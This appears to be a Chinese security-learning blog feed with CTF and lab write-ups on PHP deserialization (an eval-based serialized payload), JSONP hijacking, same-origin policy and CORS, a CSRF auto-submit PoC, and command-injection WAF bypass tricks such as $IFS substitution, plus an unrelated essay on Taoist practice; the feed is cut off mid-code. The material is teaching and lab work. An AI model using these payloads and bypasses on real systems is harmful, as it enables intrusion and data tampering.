  </entry>
  
  
  
  <entry>
    <title>PHP反序列化-WriteUp</title>
    <link href="/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/"/>
    <url>/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/</url>
    
    <content type="html"><![CDATA[<blockquote><p>注意事项：阅读之前先要学会 php 的基础语法，面向对象的一些基础知识</p></blockquote><h1 id="什么是序列化和反序列化"><a href="#什么是序列化和反序列化" class="headerlink" title="什么是序列化和反序列化"></a>什么是序列化和反序列化</h1><ul><li>序列化是将对象转换成可存储的字节序列的过程</li><li>反序列化是将字节序列恢复为对象</li></ul><h1 id="一个简单的实例"><a href="#一个简单的实例" class="headerlink" title="一个简单的实例"></a>一个简单的实例</h1><ul><li>序列化 serialize 函数</li></ul><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span>     <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$name</span> = <span class="hljs-string">&quot;Lixiney&quot;</span>;    <span class="hljs-comment">// 内部变量</span>    <span class="hljs-keyword">var</span> <span class="hljs-variable">$age</span> = <span class="hljs-string">&quot;18&quot;</span>;         <span class="hljs-comment">// 内部变量</span>    &#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();       <span class="hljs-comment">// new 一个对象</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);          <span class="hljs-comment">// 输出 序列化的字符串</span><span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/./PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/image-20250913223337798.png" alt="image-20250913223337798"></p><ul><li>反序列化 unserialize 函数</li></ul><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$str</span> = <span class="hljs-string">&#x27;O:1:&quot;a&quot;:2:&#123;s:4:&quot;name&quot;;s:7:&quot;Lixiney&quot;;s:3:&quot;age&quot;;s:2:&quot;18&quot;;&#125;&#x27;</span>;  <span class="hljs-comment">//上一步操作中的序列化后的字符串</span><span class="hljs-variable">$a</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$str</span>);  <span class="hljs-comment">// 反序列化</span><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">var_dump</span>(<span class="hljs-variable">$a</span>); <span class="hljs-comment">// var_dump() 查看变量类型</span><span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/./PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/image-20250913223801807.png" alt="image-20250913223801807"></p><h1 id="什么是反序列化漏洞"><a href="#什么是反序列化漏洞" class="headerlink" title="什么是反序列化漏洞"></a>什么是反序列化漏洞</h1><p>序列化和反序列化本身没有什么问题，但是当 用户参数可控，而且后台错误的使用了一些危险函数的时候，就会出现安全问题</p><ul><li>一些魔法函数</li></ul><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-title function_ invoke__">__construct</span>()            <span class="hljs-comment">//类的构造函数，创建对象时触发</span><span class="hljs-title function_ invoke__">__destruct</span>()             <span class="hljs-comment">//类的析构函数，对象被销毁时触发</span><span class="hljs-title function_ invoke__">__call</span>()                 <span class="hljs-comment">//在对象上下文中调用不可访问的方法时触发</span><span class="hljs-title function_ invoke__">__callStatic</span>()           <span class="hljs-comment">//在静态上下文中调用不可访问的方法时触发</span><span class="hljs-title function_ invoke__">__get</span>()                  <span class="hljs-comment">//读取不可访问属性的值时，这里的不可访问包含私有属性或未定义</span><span class="hljs-title function_ invoke__">__set</span>()                  <span class="hljs-comment">//在给不可访问属性赋值时触发</span><span class="hljs-title function_ invoke__">__isset</span>()                <span class="hljs-comment">//当对不可访问属性调用 isset() 或 empty() 时触发</span><span class="hljs-title function_ invoke__">__unset</span>()                <span class="hljs-comment">//在不可访问的属性上使用unset()时触发</span><span class="hljs-title function_ invoke__">__invoke</span>()               <span class="hljs-comment">//当尝试以调用函数的方式调用一个对象时触发</span><span class="hljs-title function_ invoke__">__sleep</span>()                <span class="hljs-comment">//执行serialize()时，先会调用这个方法</span><span class="hljs-title function_ invoke__">__wakeup</span>()               <span class="hljs-comment">//执行unserialize()时，先会调用这个方法</span><span class="hljs-title function_ invoke__">__toString</span>()             <span class="hljs-comment">//当反序列化后的对象被输出在模板中的时候（转换成字符串的时候）自动调用</span></code></pre></div><p>接下来我们来逐行解析一下 赛题的代码</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);  <span class="hljs-comment">// eval函数会将字符串当成php代码执行</span>    &#125;&#125;<span class="hljs-variable">$a</span>=<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;flag&#x27;</span>]);    <span class="hljs-comment">//从get方式传入一个数据</span><span class="hljs-variable">$a</span>-&gt;<span class="hljs-title function_ invoke__">action</span>();   <span class="hljs-comment">// 执行了 action 函数</span><span class="hljs-meta">?&gt;</span></code></pre></div><p>首先是 <code>&lt;?php ?&gt;</code> 这个是用来表示php语言的，php 脚本 以 <code>&lt;?php</code> 开始 ， 以 <code>?&gt;</code> 结束</p><p>highlight_file() 函数用来高亮显示代码</p><p>error_reporting(0) 表示清空本页的报错信息</p><p>eval 函数可以将字符串当作php代码执行</p><p>例如：</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;phpinfo();&quot;</span>;<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/./PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/image-20250913224910091.png" alt="image-20250913224910091"></p><p>​既然 php 代码可以执行，那我们就可以执行一些危险的命令，如下</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$str</span> = <span class="hljs-string">&quot;system(&#x27;calc&#x27;);&quot;</span>;   <span class="hljs-comment">// 执行系统命令 calc 是打开计算器</span><span class="hljs-keyword">eval</span>(<span class="hljs-variable">$str</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/./PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/image-20250913225143367.png" alt="image-20250913225143367"></p><p>根据这个原理就可以拿到 flag.php 中的 内容</p><p>下面这个代码用来生成 payload</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">a</span></span>&#123;    <span class="hljs-keyword">var</span> <span class="hljs-variable">$act</span>;    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">action</span>(<span class="hljs-params"></span>)</span>&#123;        <span class="hljs-keyword">eval</span>(<span class="hljs-variable language_">$this</span>-&gt;act);    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">a</span>();<span class="hljs-variable">$a</span> -&gt; act = <span class="hljs-string">&quot;highlight_file(&#x27;flag.php&#x27;);&quot;</span>; <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<span class="hljs-meta">?&gt;</span></code></pre></div><p>根据前文所写的 高亮显示代码的函数 可以查看 flag.php 中的内容</p><div class="code-wrapper"><pre><code class="hljs php">O:<span class="hljs-number">1</span>:<span class="hljs-string">&quot;a&quot;</span>:<span class="hljs-number">1</span>:&#123;s:<span class="hljs-number">3</span>:<span class="hljs-string">&quot;act&quot;</span>;s:<span class="hljs-number">27</span>:<span class="hljs-string">&quot;highlight_file(&#x27;flag.php&#x27;);&quot;</span>;&#125;</code></pre></div><p><img src="/./PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-WriteUp/image-20250913230645311.png" alt="image-20250913230645311"></p><p>提交到 ?flag 拿到flag</p>]]></content>
    
    
    
    <tags>
      
      <tag>反序列化</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>JSONP 漏洞</title>
    <link href="/JSONP-%E6%BC%8F%E6%B4%9E/"/>
    <url>/JSONP-%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="Jsonp-原理"><a href="#Jsonp-原理" class="headerlink" title="Jsonp 原理"></a>Jsonp 原理</h1><blockquote><p>jsonp 可以让网页从别的域获取内容，即跨域读取数据</p><p>攻击者模拟用户向有漏洞的服务器发送 jsonp 请求，然后获取到了用户的某些信息，再将这些信息发送到攻击者可控的服务。</p></blockquote><p>jsonp 最基本的原理就是，动态添加一个 &lt;script&gt; 标签，而script标签的 src属性是没有跨域限制的</p><p>由于同源策略的限制，xmlHttpRequest 只允许请求当前 相同协议、域名、端口 的资源，如果要进行跨域请求，我们可以通过使用 script 标签来进行跨域请求，并在相应追踪返回要执行的 script 代码，可以直接使用json传递javascript对象</p><h1 id="JSONP-攻击方法"><a href="#JSONP-攻击方法" class="headerlink" title="JSONP 攻击方法"></a>JSONP 攻击方法</h1><p>和csrf类似，都需要用户登录账号，身份认证还没有被消除的情况下访问攻击者设计好的页面，就会获取json数据，将json数据发送给攻击者，寻找敏感json数据api接口，构造恶意代码，发送给用户，用户访问有恶意的页面，数据就会被劫持发送到远程服务器。</p><h1 id="JSONP-简单实现"><a href="#JSONP-简单实现" class="headerlink" title="JSONP 简单实现"></a>JSONP 简单实现</h1><ul><li><p>前端 <a href="http://localhost/">http://localhost</a></p>  <div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">callBack</span>(<span class="hljs-params">json</span>)&#123;</span><span class="language-javascript">    <span class="hljs-title function_">alert</span>(<span class="hljs-title class_">JSON</span>.<span class="hljs-title function_">stringify</span>(json));</span><span class="language-javascript">  &#125;</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span> <span class="hljs-attr">src</span>=<span class="hljs-string">&quot;http://localhost:8888/?callback=callBack&quot;</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span></code></pre></div></li><li><p>后端 <a href="http://localhost:8888/">http://localhost:8888</a></p>  <div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: application/javascript&quot;</span>);<span class="hljs-variable">$param</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;callback&#x27;</span>];<span class="hljs-variable">$info</span> = <span class="hljs-string">&quot;&#123;&#x27;name&#x27;: &#x27;Lixiney&#x27;, &#x27;age&#x27;: 18&#125;&quot;</span>;<span class="hljs-variable">$info</span> = <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$info</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;<span class="hljs-subst">$param</span>(<span class="hljs-subst">$info</span>)&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div></li></ul>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>jsonp</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>同源策略</title>
    <link href="/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/"/>
    <url>/%E5%90%8C%E6%BA%90%E7%AD%96%E7%95%A5/</url>
    
    <content type="html"><![CDATA[<blockquote><p>欠了好久的文章（之前一直想着要好好学安全的，但是玩起来就忘我了&#x3D;_&#x3D;），今天终于有时间能写写了。</p></blockquote><h1 id="什么是同源策略"><a href="#什么是同源策略" class="headerlink" title="什么是同源策略"></a>什么是同源策略</h1><p>之前刚刚学习的时候，那是做一个前后端分离的项目，有一串json数据要从后端提取，前端用的语言是 vue，使用了8080端口，后端为php语言，80端口。后来发现这个数据愣是找不到，一番检查之下，发现是同源策略的问题。</p><p>那么问题来了，为什么会有同源策略呢？其实简单的思考一下就能想到，同一个后端接口，我能访问到，别人也能访问到，这就构成了一个很严重的数据安全问题。</p><p>浏览器的同源策略规定，不同域的客户端脚本在没有明确授权的情况下，不能读写对方的资源</p><p>那么概念理解完了，所谓的“同源”是什么意思呢？</p><ul><li>相同协议</li><li>相同域名</li><li>相同端口号</li></ul><h1 id="同源策略允许的行为"><a href="#同源策略允许的行为" class="headerlink" title="同源策略允许的行为"></a>同源策略允许的行为</h1><ul><li>链接 &lt;a&gt; 标签</li><li>重定向</li><li>嵌入资源<ul><li>&lt;script src&#x3D;””&gt; 可以加载跨域的js 但是收到 cors 的限制</li><li>link 标签， 可以加载跨域的css</li><li>img video audio 等标签</li><li>iframe 标签，可以加载跨域的页面，但是无法使用 js 读取其内容</li><li>@font-face </li><li>&lt;object&gt; &lt;embed&gt; &lt;applet&gt;</li></ul></li></ul><h1 id="合法绕过同源策略"><a href="#合法绕过同源策略" class="headerlink" title="合法绕过同源策略"></a>合法绕过同源策略</h1><p>通常使用 CORS 方法</p><h2 id="CORS-跨域资源共享"><a href="#CORS-跨域资源共享" class="headerlink" title="CORS - 跨域资源共享"></a>CORS - 跨域资源共享</h2><blockquote><p> 需要后端服务器的支持，服务器在响应头中设置 <code>Access-Control-Allow-Origin</code> 字段</p></blockquote><p>前端 <a href="http://localhost/">http://localhost</a></p><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">html</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">html</span> <span class="hljs-attr">lang</span>=<span class="hljs-string">&quot;en&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">head</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">charset</span>=<span class="hljs-string">&quot;UTF-8&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">meta</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;viewport&quot;</span> <span class="hljs-attr">content</span>=<span class="hljs-string">&quot;width=device-width, initial-scale=1.0&quot;</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">title</span>&gt;</span>Document<span class="hljs-tag">&lt;/<span class="hljs-name">title</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">head</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">div</span> <span class="hljs-attr">onclick</span>=<span class="hljs-string">&quot;showJson()&quot;</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;text&quot;</span>&gt;</span>测试<span class="hljs-tag">&lt;/<span class="hljs-name">div</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">  <span class="hljs-keyword">function</span> <span class="hljs-title function_">showJson</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">    <span class="hljs-keyword">var</span> xhr =  <span class="hljs-keyword">new</span> <span class="hljs-title class_">XMLHttpRequest</span>();</span><span class="language-javascript">    </span><span class="language-javascript">    xhr.<span class="hljs-property">onreadystatechange</span> = <span class="hljs-keyword">function</span>(<span class="hljs-params"></span>)&#123;</span><span class="language-javascript">      <span class="hljs-keyword">if</span>(xhr.<span class="hljs-property">status</span>==<span class="hljs-string">&#x27;200&#x27;</span> &amp;&amp; xhr.<span class="hljs-property">readyState</span>== <span class="hljs-string">&#x27;4&#x27;</span>)&#123;</span><span class="language-javascript">        <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">getElementById</span>(<span class="hljs-string">&#x27;text&#x27;</span>).<span class="hljs-property">innerHTML</span>=xhr.<span class="hljs-property">responseText</span>;</span><span class="language-javascript">      &#125;</span><span class="language-javascript">    &#125;</span><span class="language-javascript">    xhr.<span class="hljs-title function_">open</span>(<span class="hljs-string">&#x27;GET&#x27;</span>,<span class="hljs-string">&#x27;http://localhost:8888&#x27;</span>,<span class="hljs-literal">true</span>);</span><span class="language-javascript">    xhr.<span class="hljs-title function_">send</span>();</span><span class="language-javascript">  &#125;</span><span class="language-javascript"></span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><p>后端： <a href="http://localhost:8888/">http://localhost:8888</a></p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Access-Control-Allow-Origin: http://localhost&quot;</span>);<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;1&quot;</span>;<span class="hljs-meta">?&gt;</span></code></pre></div><h1 id="JSONP-方式-目前已经过时"><a href="#JSONP-方式-目前已经过时" class="headerlink" title="JSONP 方式 - 目前已经过时"></a>JSONP 方式 - 目前已经过时</h1><ul><li>利用 script 标签没有跨域限制的特性来实现。</li><li>客户端定义一个回调函数，然后通过script标签的src来请求一个 api地址，并带上回调函数名，服务器将数据包装在这个回调函数中返回，浏览器接收到后就会执行这个函数</li><li>缺点是只支持get请求，错误处理困难，并且存在严重的安全风险。</li></ul><p>还有一些其他的方法如 ： websocket 、代理服务器等。</p>]]></content>
    
    
    <categories>
      
      <category>开发</category>
      
    </categories>
    
    
    <tags>
      
      <tag>同源策略</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>杂记</title>
    <link href="/%E6%9D%82%E8%AE%B0/"/>
    <url>/%E6%9D%82%E8%AE%B0/</url>
    
    <content type="html"><![CDATA[<blockquote><p>本篇文章留待有缘人看到。。。</p></blockquote><p>今天不记录有关技术问题的文章，简单的写一些本人对于生活对于现实，以及一些对于修行上的感悟。</p><p>其实我个人不喜欢自己写东西，因为我明白，只要你写出来，就会有人看，就会有人信，又不可能人人都是圣人，难免会有些错误的观念，让他人学去岂不是误人子弟？当然现在有很大一部分人很“蒙”，认为记在脑子里就是会了，但是懂不懂呢？不知道，他们不去求证，知行不合一，当然这也是现在教育行业很大的一个不合理的地方。</p><p>当然，聊到教育问题，这就不得不提一嘴国内那些个专家教授的了，说实话截止到目前，我是一名本科生，我仍然不知道 “专家” 这是一个什么职位，就好比我前文中所写，你作为一名教师，那就老实本分教授课本中的知识就可以了，而不是整天在网上散布一些你认为对的观念，当然，有人信那叫误人子弟，让人当成笑柄的那叫傻逼。</p><p>以上我说的是谁，我也不便指名道姓，自行搜索 “农名才是世界上最懒得人” 即可。</p><p>当然，以上为本人观点，切勿盲目迷信。</p><p>本人不是佛门弟子，乱世之中有幸得遇恩师，闻太一道法，得 “太乙救苦天尊”以及太一祖师护佑，拜为道教太一派弟子，关于这些我并不想多说什么，因为我也只是一名普通的修道者，算是一名小学生，才疏学浅，说多了免得给师父，给师门，给祖师抹黑。</p><p>关于“末法时代”一事，我认为所言非虚，这个时代是一个妖魔鬼怪横行的时代，读者可以自行上网浏览，根据本篇文章的上传日期，搜索近期国内外发生的各种事迹，在此不一一列举。</p><p>首先我要讲一下末法时代是什么，在《佛说法灭尽经》 中：</p><blockquote><p>佛告阿难：“我涅槃后，佛法将要灭去时，在这五浊世中，魔道兴盛。魔鬼成为沙门，来破坏扰乱我的道法。魔沙门不但会穿世间人衣裳，还乐于好看的五色袈裟。魔沙门饮酒、吃肉、杀生，贪恋美味，没有慈心，又互相憎恨嫉妒。</p></blockquote><p>如今短视频网站上宗教乱象频出，着实该好好反思。</p><p>不知道各位有没有刷到过这样一句话。</p><blockquote><p>你知道为什么我信道不信佛吗 信佛的每天早上起来说的是阿弥陀佛 佛祖保佑我 那你知道我每天早上起来说的是什么吗 气我者自断财路 害我者百病缠身算计我者 替我吞苦 欺我者替我扛病 苍天有眼加倍偿还</p></blockquote><p>千篇一律的文案，诸位可以去某音上搜，有一堆，外行人看起来确实有点像是那么回事，实则不然</p><p>这是典型的外门邪说，能说出来这种话的，不是外行人，也是一名纯种的道青，要么就是邪道。</p><p>道教重在修心养性，而非恶意诅咒，至于我上一段为什么这么说，这里我引用一下我入门读的第一本经书《太上老君说常清静经》吧。</p><blockquote><p>老君曰：上士无争，下士好争；上德不德，下德执德；执著之者，不名道德。众生所以不得真道者，为有妄心；既有妄心，即惊其神；既惊其神，即著万物；既著万物，即生贪求；既生贪求，即是烦恼；烦恼妄想，忧苦身心；便遭浊辱，流浪生死；常沉苦海，永失真道。真常之道，悟者自得；得悟道者，常清静矣！</p></blockquote><p>这里我发表一些个人拙见：</p><p>我们道家讲究修行，修行修的是什么呢？修心，修我们的元神。有个词语叫做“心猿意马”，心和意，这两个是最为活泼好动的东西，要让这两个东西静下来，才算是修有所成，为什么这么说呢？</p><p>道教有“元神”和“识神”的说法，具体可以看看《太乙金华宗旨》</p><p>简单来说，元神随着胎儿一起来到世间，封闭在身体内，不能直接接触事物，需要通过各种方式在大脑内存储各种信息，元神才能对这种信息做出判断，同时，随着知识越积越多，就会产生“识神”，也就是自我意识，因此，在识神没有形成以前，是元神在控制大脑，表现为行为幼稚，到了后来识神形成以后，阻碍了元神与大脑的沟通，虽然行为能力加强了，但是灵性却减弱甚至于消失。</p><p>道教认为，在进入“无极”的状态之后，人处于恬淡虚无的境界，呼吸绵绵，若有若无，没有任何思虑，目不视耳不闻，在这一个状态下，识神停止活动，元神才得以显现。</p><p>这一个过程《太乙金华宗旨》中有详细记载，不过没有人指导不建议自己摸索着练习。</p>]]></content>
    
    
    
    <tags>
      
      <tag>杂记</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>跨站请求伪造--CSRF</title>
    <link href="/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-CSRF/"/>
    <url>/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0-CSRF/</url>
    
    <content type="html"><![CDATA[<blockquote><p>攻击者通过某些技术手段欺骗用户的浏览器访问曾经认证过的网站并执行一些操作，挟持用户在当前已经登录的web应用程序上执行非本意的操作</p></blockquote><h1 id="攻击流程"><a href="#攻击流程" class="headerlink" title="攻击流程"></a>攻击流程</h1><ul><li>用户登录站点a，并通过站点a的身份验证</li><li>用户未退出站点a，在同一个浏览器中访问危险站点b</li><li>站点b收到用户请求后，返回恶意代码并且发出访问站点a的请求</li><li>浏览器收到这些恶意代码后，在用户不知情的情况下，利用cookie的信息，向网站a发出恶意请求（修改密码，转账等操作）</li><li>站点a接收到请求后，会根据用户的权限，处理请求，导致站点b的恶意代码被执行</li></ul><h1 id="漏洞poc"><a href="#漏洞poc" class="headerlink" title="漏洞poc"></a>漏洞poc</h1><div class="code-wrapper"><pre><code class="hljs html"><span class="hljs-tag">&lt;<span class="hljs-name">html</span>&gt;</span>  <span class="hljs-comment">&lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt;</span>  <span class="hljs-tag">&lt;<span class="hljs-name">body</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">form</span> <span class="hljs-attr">action</span>=<span class="hljs-string">&quot;http://localhost:2233/vul/csrf/csrfget/csrf_get_edit.php&quot;</span>&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;sex&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;phonenum&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;add&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;email&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;asd&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;hidden&quot;</span> <span class="hljs-attr">name</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;submit&quot;</span> /&gt;</span>      <span class="hljs-tag">&lt;<span class="hljs-name">input</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;submit&quot;</span> <span class="hljs-attr">value</span>=<span class="hljs-string">&quot;Submit request&quot;</span> /&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">form</span>&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">script</span>&gt;</span><span class="language-javascript"></span><span class="language-javascript">      history.<span class="hljs-title function_">pushState</span>(<span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>, <span class="hljs-string">&#x27;/&#x27;</span>);</span><span class="language-javascript">      <span class="hljs-variable language_">document</span>.<span class="hljs-property">forms</span>[<span class="hljs-number">0</span>].<span class="hljs-title function_">submit</span>();</span><span class="language-javascript">    </span><span class="hljs-tag">&lt;/<span class="hljs-name">script</span>&gt;</span>  <span class="hljs-tag">&lt;/<span class="hljs-name">body</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">html</span>&gt;</span></code></pre></div><h1 id="防御方法"><a href="#防御方法" class="headerlink" title="防御方法"></a>防御方法</h1><ul><li>增加 token 验证<ul><li>对关键操作增加token参数，token必须随机，每次都不一样</li></ul></li><li>增加验证码</li><li>身份二次认证</li><li>通过http头部中的referer来限制原页面</li></ul><p>注意：</p><blockquote><p>敏感信息使用post传参而不是get</p></blockquote>]]></content>
    
    
    <categories>
      
      <category>网络安全</category>
      
    </categories>
    
    
    <tags>
      
      <tag>web</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>命令执行WAF绕过</title>
    <link href="/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF%E7%BB%95%E8%BF%87/"/>
    <url>/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8CWAF%E7%BB%95%E8%BF%87/</url>
    
    <content type="html"><![CDATA[<blockquote><p>命令执行漏洞是指服务器没有对执行的命令进行过滤，用户可以随意执行系统命令</p></blockquote><h1 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h1><blockquote><p>应用程序有的时候需要调用一些系统命令，在php中，可以执行命令的函数有 system() exec() shell_exec() passthru() popen() proc_open() pcntl_execl() 等，当黑客能够控制这些函数中的参数时，就可以将恶意的系统命令拼接到正常的命令中，从而造成RCE攻击</p></blockquote><h1 id="漏洞危害"><a href="#漏洞危害" class="headerlink" title="漏洞危害"></a>漏洞危害</h1><ul><li>控制服务器，执行系统命令或者读写文件</li><li>反弹shell</li></ul><h1 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h1><h2 id="操作系统连接符"><a href="#操作系统连接符" class="headerlink" title="操作系统连接符"></a>操作系统连接符</h2><ul><li>分号 ’；‘ ： 多条命令无论对错顺序执行</li><li>&amp; ： 多条命令无论对错顺序执行</li><li>&amp;&amp; ：前面命令执行不成功后面的命令不执行</li><li>| ： 前面命令执行得到结果作为后面命令的输入</li><li>|| ：前面命令执行成功后面的命令不执行；前面的命令执行失败则后面的命令执行</li></ul><h1 id="WAF绕过"><a href="#WAF绕过" class="headerlink" title="WAF绕过"></a>WAF绕过</h1><h2 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h2><h3 id="大括号"><a href="#大括号" class="headerlink" title="大括号 {}"></a>大括号 {}</h3><div class="code-wrapper"><pre><code class="hljs bash">&#123;<span class="hljs-built_in">ls</span>,../&#125;</code></pre></div><h3 id="IFS-代替空格"><a href="#IFS-代替空格" class="headerlink" title="IFS 代替空格"></a>IFS 代替空格</h3><blockquote><p>linux环境中有一个特殊的变量 IFS，叫做内部字段分隔符</p></blockquote><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><span class="hljs-variable">$IFS</span>/flag</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span class="hljs-built_in">cat</span><span class="hljs-variable">$&#123;IFS&#125;</span>/flag</code></pre></div><div class="code-wrapper"><pre><code class="hljs bash"><span 